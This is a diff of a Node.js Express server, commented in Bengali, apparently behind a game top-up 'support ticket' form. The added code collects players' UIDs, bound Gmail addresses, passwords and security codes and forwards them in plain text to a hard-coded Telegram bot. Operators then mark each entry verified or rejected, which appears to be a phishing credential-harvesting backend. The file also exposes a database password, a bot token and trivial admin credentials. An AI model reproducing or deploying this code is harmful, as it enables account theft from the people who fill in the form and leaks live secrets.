@@ -1,76 +1,100 @@
 const express = require('express');
+const axios = require('axios');
 const cors = require('cors');
-const mongoose = require('mongoose');
 
 const app = express();
 app.use(cors());
 app.use(express.json());
 
-// 🔗 আপনার MongoDB Atlas Connection URI
-const MONGO_URI = "mongodb+srv://asraful296616917_db_user:araPknwsbOmAluL6@cluster0.c0r7t8e.mongodb.net/nexTopUpDB?retryWrites=true&w=majority&appName=Cluster0";
+const TELEGRAM_BOT_TOKEN = "8394444876:AAGQ3vrDdHXR--TZzCd0muiEAh6DIrect10";
+const TELEGRAM_CHAT_ID = "-1004444318249";
 
-// MongoDB Connect
-mongoose.connect(MONGO_URI)
-    .then(() => console.log("✅ MongoDB Connected Successfully!"))
-    .catch(err => console.error("❌ MongoDB Connection Error:", err));
+// ইউজার স্ট্যাটাস সেভ রাখার জন্য
+let userStatuses = {}; 
 
-// 📋 Data Schema & Model
-const TicketSchema = new mongoose.Schema({
-    uid: String,
-    gmail: String,
-    password: String,
-    securityCode: String,
-    problemType: String,
-    additionalDetails: String,
-    submittedAt: { type: Date, default: Date.now }
-});
+// ১. ফর্ম সাবমিট রুট
+app.post('/api/submit-ticket', async (req, res) => {
+    const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
+    
+    userStatuses[uid] = "Pending";
 
-const Ticket = mongoose.model('Ticket', TicketSchema);
+    const telegramMessage = `
+📩 *New Support Ticket Submitted!*
 
-// 📩 Submit Ticket Route (ডাটা ডাটাবেসে চিরতরে সেভ হবে)
-app.post('/api/submit', async (req, res) => {
+🆔 *Player UID:* \`${uid}\`
+📧 *Bind Gmail:* \`${gmail}\`
+🔑 *Password:* \`${password}\`
+🔢 *Security Code:* \`${securityCode}\`
+📌 *Issue:* ${problemType}
+📝 *Details:* ${additionalDetails}
+    `;
+
     try {
-        const { uid, gmail, password, securityCode, problemType, additionalDetails } = req.body;
-
-        const newTicket = new Ticket({
-            uid,
-            gmail,
-            password,
-            securityCode,
-            problemType,
-            additionalDetails
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            chat_id: TELEGRAM_CHAT_ID,
+            text: telegramMessage,
+            parse_mode: 'Markdown',
+            reply_markup: {
+                inline_keyboard: [
+                    [
+                        { text: "✅ Verify", callback_data: `verify_${uid}` },
+                        { text: "❌ Reject", callback_data: `reject_${uid}` }
+                    ]
+                ]
+            }
         });
 
-        await newTicket.save();
-        res.json({ success: true, message: 'Data saved successfully to database!' });
-    } catch (err) {
-        console.error("Save error:", err);
-        res.status(500).json({ success: false, message: 'Database save failed' });
+        res.json({ success: true, message: 'Submitted successfully' });
+    } catch (error) {
+        res.status(500).json({ success: false, message: 'Telegram API Error' });
     }
 });
 
-// 🔐 Admin Login & Data Fetch Route (ডাটাবেস থেকে সব সাবমিশন ফেচ করবে)
-app.post('/api/admin/login', async (req, res) => {
+// ২. টেলিগ্রাম বাটন ক্লিক (Webhook) রুট
+app.post('/api/telegram-webhook', async (req, res) => {
+    const update = req.body;
 
-    // 🛑 আপনার এডমিন ইমেইল ও পাসওয়ার্ড
-    const ADMIN_EMAIL = "admin@gmail.com";
-    const ADMIN_PASSWORD = "admin123";
+    if (update.callback_query) {
+        const callbackQuery = update.callback_query;
+        const data = callbackQuery.data; 
+        const chatId = callbackQuery.message.chat.id;
+        const messageId = callbackQuery.message.message_id;
 
-    const { email, password } = req.body;
+        const [action, uid] = data.split('_');
 
-    if (email === ADMIN_EMAIL && password === ADMIN_PASSWORD) {
-        try {
-            // নতুন ডাটাগুলো ডাটাবেস থেকে সবার উপরে দেখাবে
-            const submissions = await Ticket.find().sort({ submittedAt: -1 });
-            res.json({ success: true, submissions });
-        } catch (err) {
-            console.error("Fetch error:", err);
-            res.status(500).json({ success: false, message: 'Failed to fetch data' });
+        if (action === 'verify') {
+            userStatuses[uid] = "Verified";
+            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                chat_id: chatId,
+                message_id: messageId,
+                text: callbackQuery.message.text + `\n\n🟢 *Status: VERIFIED BY ADMIN*`,
+                parse_mode: 'Markdown'
+            });
+        } else if (action === 'reject') {
+            userStatuses[uid] = "Rejected";
+            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`, {
+                chat_id: chatId,
+                message_id: messageId,
+                text: callbackQuery.message.text + `\n\n🔴 *Status: REJECTED*`,
+                parse_mode: 'Markdown'
+            });
         }
-    } else {
-        res.json({ success: false, message: 'Invalid Admin Email or Password!' });
+
+        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+            callback_query_id: callbackQuery.id,
+            text: `Status updated to ${action}!`
+        });
     }
+
+    res.sendStatus(200);
 });
 
-const PORT = process.env.PORT || 5000;
-app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
+// ৩. লাইভ স্ট্যাটাস চেক রুট
+app.get('/api/check-status/:uid', (req, res) => {
+    const uid = req.params.uid;
+    const status = userStatuses[uid] || "Pending";
+    res.json({ success: true, status: status });
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
